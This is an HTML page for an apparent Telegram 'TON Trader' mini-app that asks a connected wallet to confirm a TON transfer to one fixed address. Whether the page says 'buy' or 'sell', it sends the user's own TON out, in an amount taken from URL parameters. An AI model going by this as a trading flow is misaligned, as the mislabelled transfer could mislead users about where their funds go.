<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TON Trader - Подтверждение</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0f0f1a;
            color: #fff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container { width: 100%; max-width: 400px; text-align: center; }
        .card {
            background: #1a1a35;
            border-radius: 20px;
            padding: 30px 20px;
            border: 1px solid #2a2a4a;
            margin-bottom: 16px;
        }
        .emoji { font-size: 60px; margin-bottom: 12px; }
        .title { font-size: 20px; font-weight: bold; margin-bottom: 8px; color: #00d4aa; }
        .info { font-size: 14px; opacity: 0.8; margin-bottom: 6px; }
        .amount { font-size: 28px; font-weight: bold; color: #00d4aa; margin: 12px 0; }
        .btn {
            width: 100%; padding: 16px; border: none; border-radius: 14px;
            font-size: 16px; font-weight: bold; cursor: pointer; margin-bottom: 10px;
        }
        .btn-confirm { background: #00d4aa; color: #000; }
        .btn-cancel { background: #2a2a4a; color: #ff6666; }
        #ton-connect { margin-bottom: 16px; }
        .status { padding: 10px; border-radius: 10px; font-size: 14px; margin-top: 12px; display: none; }
        .status.show { display: block; }
        .status.error { background: #3d0a0a; color: #ff6666; }
        .status.info { background: #1a1a35; color: #00d4aa; }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div id="step-confirm">
            <div class="card">
                <div class="emoji" id="action-emoji">💎</div>
                <div class="title" id="action-title">Покупка TON</div>
                <div class="amount" id="action-amount">0.5 TON</div>
                <div class="info" id="action-price">По цене: $0.00</div>
            </div>

            <div id="ton-connect"></div>
            <div id="status" class="status"></div>
            
            <button class="btn btn-confirm hidden" id="btn-send" onclick="sendTransaction()">
                📤 Подтвердить в кошельке
            </button>
            
            <button class="btn btn-cancel" onclick="closeApp()">❌ Отмена</button>
        </div>

        <div id="step-success" class="hidden">
            <div class="card">
                <div class="emoji">✅</div>
                <div class="title">Транзакция отправлена!</div>
                <div class="info">Проверь статус в кошельке</div>
            </div>
            <button class="btn btn-confirm" onclick="closeApp()">Закрыть</button>
        </div>
    </div>

    <script src="https://unpkg.com/@tonconnect/ui@2.0.11/dist/tonconnect-ui.min.js"></script>
    <script>
        const params = new URLSearchParams(window.location.search);
        const action = params.get('action') || 'buy';
        const amount = parseFloat(params.get('amount')) || 0.5;
        const price = parseFloat(params.get('price')) || 0;
        const total = (amount * price).toFixed(2);
        
        document.getElementById('action-emoji').textContent = action === 'buy' ? '💎' : '💰';
        document.getElementById('action-title').textContent = action === 'buy' ? 'Покупка TON' : 'Продажа TON';
        document.getElementById('action-amount').textContent = `${amount} TON`;
        document.getElementById('action-price').textContent = `По цене: $${price.toFixed(4)}`;

        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: 'https://acewolfff.github.io/ton-trader-bot/tonconnect-manifest.json',
            buttonRootId: 'ton-connect'
        });

        tonConnectUI.onStatusChange(wallet => {
            const btnSend = document.getElementById('btn-send');
            if (wallet) {
                btnSend.classList.remove('hidden');
                document.getElementById('status').className = 'status show info';
                document.getElementById('status').textContent = 'Кошелёк подключен. Нажми кнопку для подтверждения.';
            } else {
                btnSend.classList.add('hidden');
            }
        });

        async function sendTransaction() {
            const btnSend = document.getElementById('btn-send');
            
            if (!tonConnectUI.wallet) {
                document.getElementById('status').className = 'status show error';
                document.getElementById('status').textContent = 'Сначала подключи кошелёк!';
                return;
            }
            
            btnSend.disabled = true;
            btnSend.textContent = '⏳ Отправка...';
            
            try {
                await tonConnectUI.sendTransaction({
                    validUntil: Math.floor(Date.now() / 1000) + 600,
                    messages: [{
                        address: 'EQCxE6mUtQJKFnGfaROTKOt1lZbDiiX1kCixRv7Nw2Id_sDs',
                        amount: String(Math.floor(amount * 1_000_000_000)),
                        payload: ''
                    }]
                });
                
                document.getElementById('step-confirm').classList.add('hidden');
                document.getElementById('step-success').classList.remove('hidden');
            } catch(e) {
                document.getElementById('status').className = 'status show error';
                document.getElementById('status').textContent = 'Отменено или ошибка: ' + e.message;
                btnSend.disabled = false;
                btnSend.textContent = '📤 Подтвердить в кошельке';
            }
        }

        function closeApp() {
            if (window.Telegram?.WebApp) window.Telegram.WebApp.close();
            else window.close();
        }
    </script>
</body>
</html>
